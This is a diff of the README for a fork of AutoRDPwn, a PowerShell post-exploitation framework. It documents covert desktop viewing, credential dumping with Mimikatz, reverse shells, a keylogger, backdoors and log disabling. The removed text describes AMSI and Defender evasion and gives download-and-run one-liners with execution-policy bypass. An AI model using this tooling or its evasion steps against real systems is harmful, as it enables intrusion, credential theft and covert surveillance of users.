@@ -1,190 +1,170 @@
-<p align="center"><img width=450 alt="AutoRDPwn" src="https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/AutoRDPwn.png"></p>
+# AutoRDPwn 6.0
 
-**AutoRDPwn** is a post-exploitation framework created in Powershell, designed primarily to automate the **Shadow** attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to view his victim's desktop without his consent, and even control it on demand, using tools native to the operating system itself.
+AutoRDPwn is a PowerShell post-exploitation framework for Windows. It automates
+the Shadow attack — a SYSTEM scheduled task that opens a console session on the
+remote host — and puts 34 actions behind one menu: remote execution, shells,
+credential extraction, pivoting, desktop forensics, persistence and privilege
+escalation. Version 6.0 replaces the old screen path: the target runs a JPEG
+frame server in the console session and the operator pulls frames over HTTP. No
+VNC DLL is injected on the target and the target never dials back.
 
-This is a fork of the original [AutoRDPwn](https://github.com/JoelGMSec/AutoRDPwn) by Joel Gámez Molina, extended with new post-exploitation modules such as the **Stealth Screen** engine (invisible screenshots and live reverse VNC of the remote console session).
+This repository is a fork of [AutoRDPwn](https://github.com/JoelGMSec/AutoRDPwn)
+by Joel Gámez Molina.
 
-Thanks to the additional modules, it is possible to obtain a remote shell through Netcat, dump system hashes with Mimikatz, load a remote keylogger and much more. All this, Through a completely intuitive menu in seven different languages.
+## Author
 
-Additionally, it is possible to use it in a reverse shell through a series of parameters that are described in the usage section.
+- Fork, v5.x modules and v6.0 rewrite: **jeko** ([jeko1107](https://github.com/jeko1107))
+- Original framework: **Joel Gámez Molina** ([@JoelGMSec](https://github.com/JoelGMSec))
 
+## Requirements
 
-# Requirements
-Powershell 4.0 or higher
+Operator: Windows with Windows PowerShell 5.1 or PowerShell 7+, administrator
+rights, and the `Resources\` folder beside `AutoRDPwn.ps1`. A missing resource is
+a hard error; set `AUTORD_PWN_ALLOW_DOWNLOAD=1` to fetch it from the repository.
+Started unelevated, the launcher raises a UAC prompt and forwards its arguments;
+`-noadmin` keeps the current console instead.
 
+Target: Windows with PowerShell 5.1 and WinRM enabled, plus a local administrator
+account. Inbound TCP 445 for PSexec, 135 for WMI, 5985 for WinRM, WinRS and Quick
+Screen, and 3389 for the RDP actions. Quick Screen also needs 8081 while it runs;
+the module creates that firewall rule before the listener opens and deletes it
+during teardown.
 
-# Changes
-## Version 5.2 (this fork)
-• New module: **Stealth Screen** - captures an invisible screenshot or opens a live reverse VNC view of the remote console session, without the victim noticing
-
-• Injection engine: acquires the interactive user token of console session 1 and spawns the payload on the target desktop with CreateProcessAsUserW, no window is ever shown on the victim
-
-• Delivery through an ephemeral scheduled task running as SYSTEM, registered and unregistered automatically in every run
-
-• The target side stages only temporary scripts under C:\Windows\Temp and removes them after execution; the VNC module is fetched over HTTP from the attacker and decoded in memory before it runs
-
-• View mode uses an UltraVNC reverse connection: the target connects back to the attacker's listener, so no inbound firewall rule is needed on the victim
-
-• Shot mode captures a full-resolution PNG of the target screen and pulls it back over the existing WinRM channel
-
-• VNC module delivery is AMSI-evasive: the payload travels XOR-encrypted over HTTP and is patched at runtime before execution, with the AMSI patch built from char codes so no plaintext indicator is present
-
-• Unified menu: attack vectors and all modules live in a single arrow-key TUI, there is no separate modules screen any more
-
-• Defender exclusions and the SYSTEM task run before the payload lands, so the decode/execute step is not scanned
-
-• Every attack in every menu now shows a short description of what it does and what it is for, in all seven languages
-
-• Fixed Handle leaks and P/Invoke marshaling errors in the token engine (wtsapi32, kernel32 and advapi32 signatures)
-
-• Elevation is now requested with a normal UAC prompt when not running as Administrator; -noadmin keeps the menu unelevated
-
-## Version 5.1
-• Many bugs fixed
-
-• Aesthetic improvements and improved waiting times
-
-• Proxy-Aware connection through system settings
-
-• It is now possible to use the offline tool by downloading the .zip file
-
-• Language auto-detection by pressing the enter key
-
-• Invoke-DCOM has been replaced by SharpRDP
-
-• PowerUp has been replaced by Invoke-PrivescCheck
-
-• Creation of the automatic cleaning subroutine in the victim
-
-• New module available: SMB Shell encrypted with AES
-
-• New module available: Change user with RunAs
-
-*The rest of the changes can be consulted in the CHANGELOG file
-
-
-# Usage
-This application can be used locally, remotely or to pivot between teams.
-
-When used remotely in a reverse shell, it is necessary to use the following parameters:
-
-| Parameter               | Description                                                                                    | 
-| :---------------------- | :--------------------------------------------------------------------------------------------- | 
-| **-noadmin**            | Keeps the menu in the current console, without requesting elevation                            |
-| **-nogui**              | This will avoid loading the menu and some colors, guaranteed its functionality                 | 
-| **-lang**               | We will choose our language (English, Spanish, French, German, Italian, Russian or Portuguese) |
-| **-option**             | Action ID to run directly (1-8, 101-704); legacy aliases 11-17 are still accepted              |
-| **-shadow**             | We will decide if we want to see or control the remote device                                  |
-| **-createuser**         | This parameter is optional, the user AutoRDPwn:AutoRDPwn will be created on the victim machine |
-| **-noclean**            | Skips target/user artifact cleanup; Defender exclusions are still restored                     |
-
-### Running the menu
-When the console is not running as Administrator, AutoRDPwn requests elevation with a normal UAC prompt. If the prompt is cancelled, it prints an error and exits.
-
-• Run the terminal as **Administrator** - the menu starts directly
-
-• Launch with **-noadmin** - keeps the menu in the current console, without elevation
-
-**Saved targets:**
-Press `P` to load a saved target profile and `S` to save the current target. Profiles keep the host, user, domain, attacker IP and mode, and are stored in `Resources\Tools\targets.json`; passwords and NTLM hashes are protected with Windows DPAPI and the file is ignored by git.
-
-**Local execution on one line:**
-```
-powershell -ep bypass "cd $env:temp ; iwr https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/AutoRDPwn.ps1 -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"
-```
-
-**Example of remote execution on a line:**
-```
-powershell -ep bypass "cd $env:temp ; iwr https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/AutoRDPwn.ps1 -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -nogui -lang English -option 4 -shadow control -createuser"
-```
-
-
-### The detailed guide of use can be found at the following link:
-
-https://darkbyte.net/autordpwn-la-guia-definitiva
-
-
-# Stealth Screen module
-## Quick Screen (menu option 8)
-The main menu includes a dedicated shortcut, so the whole flow is: target, user, password, your IP, and whether you want control or view only. The attacker IP defaults to the first non-loopback IPv4 detected on your machine, and the listener uses port 5500.
-
-```
-[8] - Quick Screen (Stealth VNC)
-     Watch or control the target screen without the user noticing
-```
-
-```
-powershell -ep bypass "cd $env:temp ; iwr https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/AutoRDPwn.ps1 -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -option 8"
-```
-
-## Direct usage
-This module can also be used directly, outside the framework menu:
+## Quick start
 
 ```powershell
-Import-Module .\Resources\Scripts\Invoke-StealthScreen.ps1
-
-# Capture a screenshot of the remote console session
-Invoke-StealthScreen -Target 192.168.1.100 -User administrator -Pass Password123! -Mode shot
-
-# Open a live reverse VNC view of the remote console session
-Invoke-StealthScreen -Target 192.168.1.100 -User administrator -Pass Password123! -Mode view -AttackerIP 192.168.1.50 -Port 5500
+git clone https://github.com/jeko1107/AutoRDPwn
+cd AutoRDPwn
+.\AutoRDPwn.ps1
 ```
 
-| Parameter        | Description                                                                                       |
-| :--------------- | :------------------------------------------------------------------------------------------------ |
-| **-Target**      | IP or hostname of the victim machine, reachable over WinRM (port 5985)                            |
-| **-User**        | Valid local administrator username on the target                                                  |
-| **-Pass**        | Password of that user                                                                             |
-| **-Mode**        | `shot` = single screenshot PNG saved to your temp folder, `view` = live reverse VNC session        |
-| **-AttackerIP**  | Your IP address, used by the target to connect back the VNC channel (view mode only)              |
-| **-Port**        | Port of the VNC listener, default 5500                                                            |
-| **-Password**    | VNC password, maximum 8 characters, default AutoRDPw                                              |
-| **-Path**        | Temporary path on the victim, default C:\Windows\Temp                                             |
-| **-ViewOnly**    | Watch the screen without sending input, the listener runs with `/viewonly` (view mode only)      |
+`AutoRDPwn.ps1` is generated from `src\`. Rebuild it after editing a source part:
 
-Requirements for the target: Windows with PowerShell 5.1 and WinRM enabled. The victim user sees nothing: the payload runs hidden in his own console session.
+```powershell
+.\Build.ps1                              # writes AutoRDPwn.ps1
+.\Build.ps1 -OutputPath _sandbox\gen.ps1 # scratch build for tests
+```
 
+`Build.ps1` concatenates `src\00-header.ps1` through `src\50-main.ps1`, parses
+every part and refuses to write output that does not parse. Run one action
+without the menu with `.\AutoRDPwn.ps1 -option 8 -shadow view`. The process exits
+`0` on success and `1` when the action throws, the option is unknown, `-option`
+is empty, or an unrecognised argument is passed.
 
-# Screenshots
-![AutoRDPwn1_en](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn1_en.PNG)
-![AutoRDPwn2_en](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn2_en.PNG)
+## Menu
 
+The TUI has two levels — categories, then the actions inside one — with a
+breadcrumb and a status line for target, mode and session. Arrows and Enter move
+and run; digits pick a category or an action; `/` filters and Esc clears the
+filter or goes back a level. `T` edits the target, `P` loads a profile, `S` saves
+it, `L` changes language, `F1` opens contextual help, `Q` or `X` quits.
 
-# License
-This project is licensed under the GNU 3.0 license - see the LICENSE file for more details.
+Category 1 is the quick-action list; the rest are grouped.
 
+| id | category | action |
+| --- | --- | --- |
+| 1 | Quick actions | PSexec (SMB) |
+| 2 | Quick actions | Pass the Hash (SMB) |
+| 3 | Quick actions | Windows Management Instrumentation (WMI) |
+| 4 | Quick actions | Windows Remote Management (WinRM) |
+| 5 | Quick actions | Windows Remote Assistance (WinRS) |
+| 6 | Quick actions | Local Session Hijacking (TSCon) |
+| 7 | Quick actions | Remote Desktop Execution (RDP) |
+| 8 | Quick actions | Quick Screen (Stealth VNC) |
+| 101 | Remote Access | Named Pipe Remote Shell (SMB) |
+| 102 | Remote Access | Semi-interactive console (WinRS) |
+| 103 | Remote Access | PowerShell HTTP-RevShell (HTTP/S) |
+| 104 | Remote Access | Netcat console (direct connection) |
+| 105 | Remote Access | Netcat console (reverse connection) |
+| 201 | Passwords and hashes | Extract local hashes with Mimikatz |
+| 202 | Passwords and hashes | Extract system passwords with Mimikatz |
+| 203 | Passwords and hashes | Obtain browsers passwords with SharpWeb |
+| 204 | Passwords and hashes | Recover Wi-Fi passwords |
+| 301 | Networking / Pivoting | TCP Port Scan |
+| 302 | Networking / Pivoting | Native Port Forwarding |
+| 303 | Networking / Pivoting | PowerShell Web Server |
+| 304 | Networking / Pivoting | Network Creds Scanner |
+| 401 | Remote Desktop Forensics | Rebuild the image cache |
+| 402 | Remote Desktop Forensics | List local users and groups |
+| 403 | Remote Desktop Forensics | Extract session credentials (SessionGopher) |
+| 501 | Backdoors and persistence | Sticky Keys Hacking |
+| 502 | Backdoors and persistence | Metasploit Reverse Shell |
+| 503 | Backdoors and persistence | Remote Keylogger |
+| 601 | Privilege escalation | Get operating system information |
+| 602 | Privilege escalation | Search vulnerabilities with Sherlock |
+| 603 | Privilege escalation | Privilege escalation audit |
+| 701 | Other modules | Deactivate system logs |
+| 702 | Other modules | Remote VNC Server (legacy) |
+| 703 | Other modules | External script execution |
+| 704 | Other modules | Change user with RunAs |
 
-# Credits and Acknowledgments
-This framework has been created and designed from scratch by Joel Gámez Molina // @JoelGMSec
+## Screen viewing (option 8)
 
-Some modules use third-party code, scripts, and tools, particularly:
+Quick Screen needs a target host, a local administrator account and a mode:
+`view` watches the console without forwarding input, `control` forwards keyboard
+and mouse. The module's own `-Mode shot` captures one full-resolution PNG and
+pulls it back over WinRM; the menu always uses the live view.
 
-• **Chachi-Enumerator** by *Luis Vacas* --> https://github.com/Hackplayers/PsCabesha-tools
+1. WinRM (5985) is checked first. A scheduled task registered as SYSTEM, and
+   removed right after it starts, launches the frame server in the interactive
+   session.
+2. The frame server captures that desktop, encodes JPEG frames at quality 55 with
+   a 200 ms interval, and answers on TCP 8081.
+3. The operator's WinForms viewer pulls the frames. Esc closes it.
 
-• **Invoke-Phant0m** by *Halil Dalabasmaz* --> https://github.com/hlldz/Invoke-Phant0m
+The firewall rule `AutoRDPwn Frame 8081` is created before the listener opens, so
+Windows raises no prompt on the target. Teardown removes the task, staged script,
+stop file, rule and server process in a `finally` block, including after an
+interrupted run.
 
-• **Invoke-PowerShellTcp** by *Nikhil "SamratAshok" Mittal* --> https://github.com/samratashok/nishang
+## Line mode and automation
 
-• **Invoke-TheHash** by *Kevin Robertson* --> https://github.com/Kevin-Robertson/Invoke-TheHash
+The line interface runs when `-nogui` is passed or stdin is redirected, which is
+the case inside a reverse shell. It asks for a category number, then an action
+number; `B` in the action list goes back to the categories.
 
-• **Mimikatz** by *Benjamin Delpy* --> https://github.com/gentilkiwi/mimikatz
+```powershell
+.\AutoRDPwn.ps1 -nogui -lang English -option 4 -shadow control -createuser
+```
 
-• **PsExec** by *Mark Russinovich* --> https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
+| switch | effect |
+| --- | --- |
+| `-noadmin` | stay in the current console, no elevation |
+| `-nogui` | line menu instead of the TUI |
+| `-lang` | English, Spanish, French, German, Italian, Russian or Portuguese |
+| `-option` | action id to run directly; legacy aliases `11`-`17` map to `101`, `201` ... `701` |
+| `-shadow` | `view` or `control` for the screen session |
+| `-createuser` | create `AutoRDPwn:AutoRDPwn` on the target for the shadow session |
+| `-noclean` | keep target-side artifacts; operator-side traces are still removed |
 
-• **RDP Wrapper** by *Stas'M Corp.* --> https://github.com/stascorp/rdpwrap
+`-option` is non-interactive: `Read-ARValue` and `Read-ARSecret` throw instead of
+prompting, so every value an action needs must already be in the loaded profile.
+The default target is `localhost`.
 
-• **SharpRDP** by *Steven F* --> https://github.com/0xthirteen/SharpRDP
+## Profiles and language
 
-And many more, that do not fit here.. Thanks to all of them and their excellent work.
+`P` loads a saved target and `S` saves the current one. Profiles live in
+`Resources\Tools\targets.json`; the last one used is remembered in `last.json`
+beside it and loaded at startup. A profile stores host, user, domain, attacker IP
+and screen mode. Passwords and NTLM hashes are protected with DPAPI
+(`ConvertFrom-SecureString`), so a profile only decrypts for the Windows account
+that wrote it.
 
+Without `-lang`, the interface follows the operator's culture and falls back to
+English. `L` changes it from the menu.
 
-# Contact
-This software does not offer any kind of guarantee. Its use is exclusive for educational environments and / or security audits with the corresponding consent of the client. I am not responsible for its misuse or for any possible damage caused by it.
+## Tests
 
-For more information, you can find me on Twitter as [@JoelGMSec](https://twitter.com/JoelGMSec) and on my blog [darkbyte.net](https://darkbyte.net).
+```powershell
+.\Tests\Run-Tests.ps1
+.\Tests\Run-Tests.ps1 -Filter 'Catalog*' -Detailed
+.\Tests\Run-Tests.ps1 -NoBuild
+```
 
+The suite builds `src\` into `_sandbox\gen.ps1`, then runs offline checks: no
+network, no elevation, no catalog action executed. Exit code `0` when nothing
+failed, `1` otherwise. See [`Tests/README.md`](Tests/README.md) for the groups.
 
-# Support
-You can support my work buying me a coffee:
+## License
 
-[<img width=250 alt="buymeacoffe" src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png">](https://www.buymeacoffee.com/joelgmsec)
+GNU General Public License v3.0. See [LICENSE](LICENSE) for the full text.
